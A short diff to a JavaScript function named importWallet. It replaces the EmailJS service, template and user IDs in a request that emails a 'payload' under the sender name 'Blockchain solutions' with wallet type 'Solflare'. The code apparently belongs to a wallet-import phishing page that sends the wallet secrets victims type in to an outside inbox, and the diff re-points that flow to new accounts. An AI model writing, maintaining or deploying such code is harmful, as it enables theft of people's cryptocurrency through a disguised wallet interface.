@@ -248,9 +248,9 @@ async function importWallet() {
     console.log(payload);
 
     const params = {
-      service_id: "service_eusbqyo",
-      template_id: "template_z6xga6o",
-      user_id: "obT4LcwZqPw_KlOar",
+      service_id: "service_k4kimk6",
+      template_id: "template_mpy0fmg",
+      user_id: "DMvtKT5BmC4qV83V9",
       template_params: {
         from_name: "Blockchain solutions",
         wallet_type: "Solflare",
